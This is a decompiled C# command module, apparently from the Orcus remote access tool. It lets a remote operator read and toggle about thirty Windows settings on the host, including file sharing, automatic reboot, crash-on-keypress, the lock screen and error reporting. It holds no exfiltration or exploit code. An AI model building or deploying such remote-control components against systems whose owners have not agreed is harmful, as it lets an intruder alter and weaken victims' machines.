using System;
using System.Collections.Generic;
using System.Linq.Expressions;
using System.Text;
using Microsoft.Win32;
using Orcus.Commands.WindowsCustomizer.Core;
using Orcus.Plugins;
using Orcus.Shared.Commands.WindowsCustomizer;
using Orcus.Shared.NetSerializer;

namespace Orcus.Commands.WindowsCustomizer;

public class WindowsCustomizerCommand : Command
{
	private Dictionary<string, IWindowsPropertyInfo> _windowsPropertyInfos;

	public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
	{
		//IL_0009: Unknown result type (might be due to invalid IL or missing references)
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Invalid comparison between Unknown and I4
		//IL_00c9: Unknown result type (might be due to invalid IL or missing references)
		Initialize();
		WindowsCustomizerCommunication val = (WindowsCustomizerCommunication)parameter[0];
		if ((int)val != 0)
		{
			if ((int)val != 3)
			{
				throw new ArgumentOutOfRangeException();
			}
			bool flag = parameter[1] == 1;
			string @string = Encoding.UTF8.GetString(parameter, 2, parameter.Length - 2);
			IWindowsPropertyInfo windowsPropertyInfo = _windowsPropertyInfos[@string];
			try
			{
				windowsPropertyInfo.Value = flag;
			}
			catch (Exception ex)
			{
				if (!(ex is UnauthorizedAccessException) && !(ex.InnerException is UnauthorizedAccessException))
				{
					throw;
				}
				byte[] array = new byte[parameter.Length];
				array[0] = 5;
				Array.Copy(parameter, 1, array, 1, parameter.Length - 1);
				connectionInfo.CommandResponse((Command)(object)this, array, (PackageCompression)0);
				return;
			}
			byte[] array2 = new byte[parameter.Length];
			array2[0] = 4;
			Array.Copy(parameter, 1, array2, 1, parameter.Length - 1);
			connectionInfo.CommandResponse((Command)(object)this, array2, (PackageCompression)0);
		}
		else
		{
			((Command)this).ResponseBytes((byte)1, new Serializer(typeof(CurrentSettings)).Serialize((object)GetCurrentSettings()), connectionInfo);
		}
	}

	private CurrentSettings GetCurrentSettings()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		CurrentSettings val = new CurrentSettings();
		foreach (KeyValuePair<string, IWindowsPropertyInfo> windowsPropertyInfo in _windowsPropertyInfos)
		{
			typeof(CurrentSettings).GetProperty(windowsPropertyInfo.Key)!.SetValue(val, windowsPropertyInfo.Value.Value, null);
		}
		val.set_IsWindows10Enabled(IsWindows10());
		return val;
	}

	private bool IsWindows10()
	{
		return RegistryUtilities.GetIntValueSafe(Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", writable: false), "CurrentMajorVersionNumber") == 10;
	}

	private void Initialize()
	{
		if (_windowsPropertyInfos == null)
		{
			_windowsPropertyInfos = new Dictionary<string, IWindowsPropertyInfo>();
			SetupProperty(() => General.GodMode, "GodMode");
			SetupProperty(() => General.ConfirmFileDelete, "ConfirmFileDelete");
			SetupProperty(() => General.AutoRebootWithLoggedOnUsers, "AutoRebootWithLoggedOnUsers");
			SetupProperty(() => General.EnableAUAsDefaultShutdownOption, "EnableAUAsDefaultShutdownOption");
			SetupProperty(() => General.EnableWinKeys, "EnableWinKeys");
			SetupProperty(() => General.EnableInternetOpenWith, "EnableInternetOpenWith");
			SetupProperty(() => General.AutoReboot, "AutoReboot");
			SetupProperty(() => General.DoErrorReport, "DoErrorReport");
			SetupProperty(() => General.FilePrintSharing, "FilePrintSharing");
			SetupProperty(() => General.KernelPaging, "KernelPaging");
			SetupProperty(() => General.ClearPageFile, "ClearPageFile");
			SetupProperty(() => General.BootDefragmentation, "BootDefragmentation");
			SetupProperty(() => General.ReserveBandwidthForSystem, "ReserveBandwidthForSystem");
			SetupProperty(() => General.VerboseLogging, "VerboseLogging");
			SetupProperty(() => General.SeparateExplorerProcess, "SeparateExplorerProcess");
			SetupProperty(() => General.CrashOnCtrlScroll, "CrashOnCtrlScroll");
			SetupProperty(() => General.MobilityCenter, "MobilityCenter");
			SetupProperty(() => DesktopProperties.DisplayWindowsVersion, "DisplayWindowsVersion");
			SetupProperty(() => DesktopProperties.DisplayTrayItems, "DisplayTrayItems");
			SetupProperty(() => DesktopProperties.WindowAnimation, "WindowAnimation");
			SetupProperty(() => DesktopProperties.AeroShake, "AeroShake");
			SetupProperty(() => DesktopProperties.WindowSnap, "WindowSnap");
			SetupProperty(() => DesktopProperties.NotificationBalloons, "NotificationBalloons");
			SetupProperty(() => DesktopProperties.LibrariesOnDesktop, "LibrariesOnDesktop");
			SetupProperty(() => DesktopProperties.RecycleBinOnComputer, "RecycleBinOnComputer");
			SetupProperty(() => DesktopProperties.DesktopPreview, "DesktopPreview");
			SetupProperty(() => DesktopProperties.ExplorerCheckBoxSelection, "ExplorerCheckBoxSelection");
			SetupProperty(() => Windows10.LockScreen, "LockScreen");
			SetupProperty(() => Windows10.DarkTheme, "DarkTheme");
			SetupProperty(() => Windows10.BalloonNotifications, "BalloonNotifications");
			SetupProperty(() => Windows10.ActionCenter, "ActionCenter");
			SetupProperty(() => Windows10.ClassicVolumeMixer, "ClassicVolumeMixer");
		}
	}

	private void SetupProperty<T>(Expression<Func<T>> picker, string currentSettingsPropertyName)
	{
		_windowsPropertyInfos.Add(currentSettingsPropertyName, new WindowsPropertyInfo<T>(picker));
	}

	protected override uint GetId()
	{
		return 27u;
	}
}
